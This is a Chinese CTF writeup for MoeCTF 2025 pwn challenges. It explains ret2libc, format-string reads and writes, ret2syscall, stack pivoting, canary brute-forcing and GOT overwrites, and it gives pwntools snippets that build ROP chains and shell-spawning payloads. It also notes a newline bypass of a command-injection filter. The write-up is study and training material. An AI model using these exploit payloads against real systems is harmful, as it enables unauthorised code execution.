@@ -1,0 +1,370 @@
+#+TITLE: MoeCTF 2025 Writeup
+#+DATE: <2025-10-09 Thu>
+
+* pwn
+pwn 题都打完了
+** 3 认识libc (ret2libc)
+（[[https://www.bilibili.com/opus/1113566122278387798][摘自B动态]]）
+1. 只说了 patchelf 换 libc 但没提示换 ld （去年的题倒是说了）
+2. 普通构造 ROP 链会导致没有 16 字节对齐，exit(69) 可但 system() 就 SIGSEGV，可通过先 ret 到一个 ret 的地址来对齐
+3. =pop rdi ; ret= 很有用，程序里找不到就去 libc 找
+4. ROPgadget 的基址是 0，ghidra 的 libc 基址一般是 0x10000，程序基址 0x400000
+
+** fmt
+https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro
+
+与 32 位不同的是，64 位前 6 个参数是通过寄存器传入，
+所以读栈一般都要从第 5 个算起（因为第一个 rdi 是 format string）
+这道题一共有两个需要读的，一个在堆一个在栈，
+#+BEGIN_EXAMPLE
+00:0000│ rsp 0x7fffffffe2a8 —▸ 0x55555555548a (main+170) ◂— lea rax, [rip + 0xbdf]
+01:0008│-090 0x7fffffffe2b0 ◂— 0x100
+02:0010│-088 0x7fffffffe2b8 —▸ 0x555555559310 ◂— 0x767a564e62 /* 'bNVzv' */
+03:0018│-080 0x7fffffffe2c0 ◂— 0xd80000
+04:0020│-078 0x7fffffffe2c8 ◂— 0xd80000
+05:0028│-070 0x7fffffffe2d0 ◂— 0x5161444f4d /* 'MODaQ' */
+06:0030│-068 0x7fffffffe2d8 ◂— 0x1b00000
+07:0038│ rdi 0x7fffffffe2e0 ◂— 'dongdigua\n'
+#+END_EXAMPLE
+对应代码
+#+BEGIN_SRC c
+  int iVar1;
+  char *heap_rand;
+  long in_FS_OFFSET;
+  char input2 [16];
+  char stack_rand [16];
+  char input1 [88];
+  long local_10;
+#+END_SRC
+此乃 pwndbg 的栈打印（其实如果用 gef 之类的可以自动化找格式化字符串），
+我先瞎试 %7$s 把堆上的爆出来了（5+栈上除了rsp处返回地址的第2个），然后试图用 %10$s 爆栈上的，
+结果 segfault 了（TODO why？）。
+然后尝试用 %10$x 结果长度不够，只能输出 8 位（因为 %x 是用于打印整数的，最大 64 位），最后 %10$p 输出够位数，然后 p64() 一下就出字符串了。
+
+** inject
+这题是来搞笑的吗？
+=strpbrk(param_1,";&|><$(){}[]\'\"`\\!~*");= 把特殊字符都过滤了但唯独没过滤换行符，简直是脑筋急转弯。
+
+** syslock
+显然这题是 ret2syscall，0x3b，还有 gadget 提示都太明显了。
+#+BEGIN_EXAMPLE
+000000000040123c <gadget>:
+  40123c:       f3 0f 1e fa             endbr64
+  401240:       5f                      pop    %rdi
+  401241:       5e                      pop    %rsi
+  401242:       5a                      pop    %rdx
+  401243:       c3                      ret
+  401244:       58                      pop    %rax
+  401245:       c3                      ret
+#+END_EXAMPLE
+（不过这段 gadget 在 ghidra 里没显示全，我还手动找了个 pop rax ; ret）
+
+这道题卡我很长时间的是一个 bug，这里 i 先填 -32 就正好能 p32(0x3b) 写入 i，
+#+BEGIN_SRC c
+  read(0,s + i,0xc);
+  if (i == 0x3b) {
+    cheat();
+  }
+#+END_SRC
+这个 0xc 也是个提示，用完 int 的 4 字节正好就剩 ='/bin/sh\0'=
+但是在有 gdb attach 的情况下写入的值都是错的，只有关了 gdb 才能过
+
+why:
+TL;DR IO 不同步
+我之前的 exp 长这样
+#+BEGIN_SRC python
+io = process("./pwn")
+gdb.attach(io)
+
+io.sendline('-32')
+io.recvline()
+io.send(p32(0x3b) + b'/bin/sh\0') # wtf is gdb doing?
+io.send(cyclic(64 + 8) + p64(gadget) + p64(binsh) + p64(0) * 2 + p64(poprax) + p64(0x3b) + p64(syscall))
+#+END_SRC
+然后我发现 i 变成了一堆 aaaabaaa
+#+BEGIN_EXAMPLE
+pwndbg> p (char *)0x404081
+$7 = 0x404081 <i+1> "aaaabaaacaa"
+#+END_EXAMPLE
+就知道是第三个 send 在这条 read 时发送了，解决办法就是在最前面加上两次 recvline 保证 IO 同步。
+因为最初读入 i 的时候缓冲区长 15，没填满，所以第二个 send 就跟第一个一块读完了。
+（注意上面 gdb 里是 <i+1>，因为 i 处正好是第二个 send 结尾的 '\0' (4+12)%15）
+
+以后遇到有未填满的缓冲区就要保证 recvline 的数量正确或者用 sendafter，否则会出现一些玄学问题。
+
+*** 另一种方式
+#+BEGIN_QUOTE
+@NazrinDuck: 其实这个题也可以填-128偏移量来写exit的got，直接写入cheat函数的地址，即使进入了lose函数也会在lose的exit函数中进入cheat函数
+#+END_QUOTE
+
+写 exit 的 got 会用到 p64 而不是 p32，会把上面 '/bin/sh\0' 的位置挤占掉。
+解决方法？再走一次 main，因为 lose 函数已经无所谓了。i 填 0，然后 12 长缓冲区随便写 binsh
+
+** ezlibc
+PIE+ASLR
+
+第一次打印的是 =read@got.plt= 也就是 got 中存储的地址，因为此时 read 函数还未加载
+（与 prelibc 的区别就是后者 printf 函数已加载）
+所以就可以想到劫持 vuln 返回到 main 再来一次，这样就是 read 的真实地址了。
+
+然而开启了 PIE（本机为 0x555555555??? 取决于环境）与 ASLR（0x5???????????）之后，则需要知道随机化之后的 main。
+还好随机化最后 12 位不变，所以直接 =read_got >> 12 << 12= 再加上 main 的后三位 hex 就好了。
+
+之后的流程就和 prelibc 一样了
+
+** ezpivot
+栈迁移
+
+这道题有两个可写的地方，bss 的 desc 第一次可写 32，第二次可改 rdi 写 2048，main 的栈可写 0x1c-12=16。
+显然栈上 16（其中 8 还是 saved rbp）完全不够，试一下也会发现连 system 函数都跑不起来（16 对齐说是）
+所以就要用到栈迁移，先用 =leave ; ret= 把栈迁移到 desc。但！是！由于栈是往低地址增长的，那我相当于最多只能有 32 的栈，
+很明显 system 对栈的要求很大，会直接写到其他段去，SIGSEGV。
+#+BEGIN_SRC c
+void introduce(uint param_1)
+{
+  read(0,desc,(ulong)param_1);
+  puts("Ok,we got your introduction!");
+  return;
+}
+#+END_SRC
+由于 read 长度是通过参数传递，所以我们可以用 =pop rdi ; ret= 修改长度为 2048，然后再返回到 introduce，这样我们获得了一个 2048 的可写空间。
+但是也出现了一些问题，因为运行时 introduce 的栈就是在 desc，我们相当于在运行时修改了栈，如果用 cyclic(2048) 填充，
+会发现 read 返回到了 aaaabaaa，这不好，因为这是 desc 的开头，说明我们无法先布置一个地址然后用 =leave ; ret= 把栈简单地迁移到比如 desc+2040
+
+不过，还有一种办法可以缩栈，那就是一直 ret，我们可以先水 251 个 ret 上去，直到空间够了，然后再构造 system 就行了。
+
+** ezprotection
+canary
+
+canary 为了防止被打印，在内存中低位为 0x00 以截断字符串，所以可以把这一位覆写为比如 0x0a，canary 就可以被 puts 一块打印出来。
+然后就是“这一次的溢出长度似乎不太够你覆盖返回地址的”，只给了两字节的溢出长度。
+还是利用 PIE+ASLR 不改变最后三位，暴力枚举一下高位就 OK。
+#+BEGIN_SRC python
+for i in range(0xf):
+    ...
+    p16((0x010127d & 0xfff) + (i << 12))
+#+END_SRC
+
+
+** fmt_s
+#+BEGIN_EXAMPLE
+             stack_addr        stack_val        points_to_val
+00:0000│ rsp 0x7fffffffe300 —▸ 0x7fffffffe448 —▸ 0x7fffffffe7fe ◂— '/home/digua/moectf2025/pwn'
+01:0008│-008 0x7fffffffe308 —▸ 0x40136f (main) ◂— endbr64 (7)
+02:0010│ rbp 0x7fffffffe310 —▸ 0x7fffffffe330 ◂— 1        (8)
+03:0018│+008 0x7fffffffe318 —▸ 0x4013b1 (main+66) ◂— addl $1, -4(%rbp)
+04:0020│+010 0x7fffffffe320 ◂— 0x1000
+05:0028│+018 0x7fffffffe328 ◂— 0x100401110
+06:0030│+020 0x7fffffffe330 ◂— 1
+07:0038│+028 0x7fffffffe338 —▸ 0x7ffff7c29d90 ◂— movl %eax, %edi
+08:0040│+030 0x7fffffffe340 ◂— 0
+09:0048│+038 0x7fffffffe348 —▸ 0x40136f (main) ◂— endbr64
+0a:0050│+040 0x7fffffffe350 ◂— 0x1ffffe430
+0b:0058│+048 0x7fffffffe358 —▸ 0x7fffffffe448 —▸ 0x7fffffffe7fe ◂— '/home/digua/moectf2025/pwn' %17$n
+#+END_EXAMPLE
+=addr_of_ntries = 0x7fffffffe32c=
+
+这道题题干提示了，fmt 不在栈上，所以不能像在栈上一样先写一个指向整形的指针然后写入。
+对于这种情况，这篇文章讲得很好： https://www.cnblogs.com/ink7/articles/18434618
+#+BEGIN_QUOTE
+%n 是以栈上地址指向的值为目标，而不是以栈上值为目标
+#+END_QUOTE
+
+这道题只需要对栈上的值进行任意写，只需要找到 栈—▸栈 的指针链，比如上面的 rbp+0x48
+#+BEGIN_EXAMPLE
++048 0x7fffffffe358 —▸ 0x7fffffffe448 —▸ 0x7fffffffe7fe ◂— '/home/digua/moectf2025/pwn' %17$hn
+#+END_EXAMPLE
+先把这个指针指向的 int 改成我们想要写的栈地址
+#+BEGIN_EXAMPLE
++048 0x7fffffffe358 —▸ 0x7fffffffe448 —▸ 0x7fffffffe32c —▸ ntries                       %17$hn
+#+END_EXAMPLE
+然后在 e448 也就是第 47 个参数，其栈上的值就是 ntries 的地址，就可以对 ntries 进行修改。
+#+BEGIN_EXAMPLE
++138 0x7fffffffe448 —▸ 0x7fffffffe32c —▸ ntries                       %47$n
+#+END_EXAMPLE
+
+类似的，我们可以抽象出对栈上任意写的函数
+#+BEGIN_SRC pyhton
+def stack_writew(n, addr): # write 16bit
+    print('----- writew #1')
+    io.recvline()
+    io.send(f'%{addr}c%17$hn')
+    context.log_level='info'
+    io.recvline()
+    context.log_level='debug'
+    io.recvline()
+    io.send(p64(114515))
+
+    print('----- writew #2')
+    io.recvline()
+    io.send(f'%{n}c%47$hn')
+    context.log_level='info'
+    io.recvline()
+    context.log_level='debug'
+    io.recvline()
+    io.send(p64(114515))
+#+END_SRC
+注意这里只写了 =%hn= 也就是 16bit，因为如果 32bit 有时数太大会发送很多字节，耗费带宽。
+如果想写 int 可以: 1. 利用相同高位（如函数的返回地址） 2. 分高低位写 3. 实在不行再直接写 int
+
+这道题溢出循环计数就可以只写高位把 int 变负
+#+BEGIN_SRC python
+stack_writew(0xffff, addr_ntries+2) # high
+#+END_SRC
+
+还有一个问题是栈地址 *依赖于环境*, 还好相同 libc 栈上值的相对位置是不变的，
+所以可以第一次用 =%p= 泄露栈上的指针，比如上面的 (8) 为 e330，再计算偏移，对所有本地算出来的地址进行修正。
+#+BEGIN_SRC python
+addrs = [...] # local
+ptrs = list(map(lambda x: int('0x'+x, 16), ptrs_raw.decode().replace('(nil)','0x0').split('0x')[1:]))
+stack_offset = (ptrs[7] & 0xffff) - 0xe330 # to fix offset in different envs
+addrs_fix = list(map(lambda x: x+stack_offset, addrs))
+#+END_SRC
+
+栈上能任意写了，那一切都好办了
+
+
+** fmt_t
+代码贴一下
+#+BEGIN_SRC c
+void hell(uint level)
+{
+  int iVar1;
+  long in_FS_OFFSET;
+  char buf [88];
+  long canary;
+  
+  canary = *(long *)(in_FS_OFFSET + 0x28);
+  printf("You\'ve reached the level %d of hell.\n",(ulong)level);
+  if ((int)level < 31) {
+    fgets_wrapper(buf,level,stdin);
+    hell(level + 11);
+    iVar1 = pd(buf,(long)(int)level); // check if there's %
+    if (iVar1 != 0) {
+      printf(buf);
+    }
+  }
+  else {
+    puts("You\'ve been swallowed by hell.");
+  }
+  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+}
+
+undefined8 main(EVP_PKEY_CTX *param_1)
+{
+  long in_FS_OFFSET;
+  char local_28 [24];
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  init(param_1);
+  fgets_wrapper(local_28,6,stdin);
+  printf(local_28);
+  puts("Anyone who uses format strings should be punished!\nGo to hell!");
+  hell(5);
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+#+END_SRC
+call stack
+#+BEGIN_EXAMPLE
+ ► 0         0x40124e hell+8
+   1         0x4012b9 hell+115
+   2         0x4012b9 hell+115
+   3         0x4012b9 hell+115
+   4         0x401361 main+103
+#+END_EXAMPLE
+正常情况下会有 4 次输入的机会，能够 fgets 字符数分别是 5 (main), 4 (hell(5)), 15 (hell(16)), 26 (hell(27))。
+所以首要的任务还是突破次数限制，为泄露 libc 地址和后续构造 rop 链做准备（吗？）。
+
+最开始我想到把 hell(5) 的返回地址写成 call hell(5) 的语句，（没写 main 是因为可写的位数不够）
+但一个显然的问题是我每次进 hell(5) 都要 hell(27) 改一次第一层的返回地址（吗？）。
+而 hell(5) 只能读 4char，并且还有 trailing zero，使得即使写低位都会失败，这一层可以说是无用的（吗？），
+所以最好能给第二第三层 hell 留一些发挥余地。
+那么就显然想到写 exit 的 got，但 exit 不在 got 里（TODO WHY），那就还有一个 =__stack_chk_fail= 可以搞，只不过需要爆 canary，
+但是依旧是每次都需要爆 canary 才能保持循环。
+
+一晚上实在想不通问了问 ds 老师。
+茅厕顿开！既然我能改 __stack_chk_fail 的 got，那为什么不改 printf 的 got 呢？
+这样在第二轮 hell(27) 通过两个 %hn 改 printf got，hell(16) 无 % 所以不打印，hell(5) 直接 =sh;%= 就爆 shell 了。。。
+
+** hardpivot
+贴个源码
+#+BEGIN_SRC c
+void vuln(void)
+{
+  undefined1 local_48 [64];
+  
+  puts("一堆废话，略");
+  printf("> ");
+  read(0,local_48,0x50);
+  return;
+}
+undefined8 main(void)
+{
+  setup();
+  vuln();
+  puts("See you again!");
+  return 0;
+}
+#+END_SRC
+可以看到 .bss 段上有一个 4k 的区域。
+以下 bss 都指 bss_buffer + 0x800，即 bss_buffer 的中点，这样就既不怕 read 写高地址也不怕栈向低地址增长。
+*** 第一次迁移
+在 vuln 的 =leave ; ret= 把 rbp 迁移到 bss+0x40，由于 ~leave = mov rsp, rbp ; pop rbp~ 所以 rsp 不变。
+返回地址写成 vuln 调用 read 的位置
+#+BEGIN_EXAMPLE
+00401264 48 8d 45 c0     LEA        RAX=>local_48,[RBP + -0x40]
+00401268 ba 50 00        MOV        EDX,0x50
+         00 00
+0040126d 48 89 c6        MOV        RSI,RAX
+00401270 bf 00 00        MOV        EDI,0x0
+         00 00
+00401275 e8 16 fe        CALL       libc.so.6::read
+         ff ff
+#+END_EXAMPLE
+read 就会从 bss 开始写，再次 ~leave ; ret~ 时，saved rbp 在 bss+0x40，返回地址在 bss+0x48，
+
+*** 第二次迁移
+#+BEGIN_SRC python
+io.send(p64(bss_buffer) # new rbp again
+        + p64(poprdiret) + p64(printf_got) # puts arg0
+        + p64(main_call_puts)
+        + p64(bss_buffer + 0x40) # new new rbp
+        + p64(vuln_call_read)
+        + cyclic(16)
+        + p64(bss_buffer) # new rbp
+        + p64(leaveret))
+#+END_SRC
+这次把 rbp 迁移到 bss+0，刚才返回地址写成 leaveret，新的 saved rbp 就在 bss+0，新的返回地址在 bss+8，
+就可以从 bss+8 开始构造 ROP 链用 main 里的 puts 泄露 printf/puts GOT 里储存的真实地址
+（不能用 vuln 里的 puts 因为下面会跟 printf，似乎又是对齐问题）
+（这里就没必要被上面两道 fmt 的题造成思维定势用 printf 再找偏移了）
+
+*** 第三次迁移
+puts 之后跟一个 saved rbp 再跟一个 vuln 调用 read 的位置。这次 rbp 还是放到 bss+0x40，read 又从 bss 开始写
+vuln 调用 read 完事的 leave;ret 又会在原位找 saved rbp 和 retaddr
+#+BEGIN_SRC python
+io.send(cyclic(32)
+        + p64(bss_buffer + 0x40)
+        + p64(poprdiret) + p64(binsh_off + libc_start)
+        + p64(ret)
+        + p64(system_off + libc_start)
+        + cyclic(8))
+#+END_SRC
+就保持 saved rbp 不变，下面构造标准的 ROP 链就完事
+
+** shellbox
+沙箱 ORW 绕过
+
+给的 64 字节正好够三个参数一个函数再返回 main。
+
+不过，这么做有点无聊了，能否搞一次栈迁移到 bss 然后 openat+sendfile（四个参数）试试？
+但似乎这题写的挺死，没法覆盖 saved rbp。
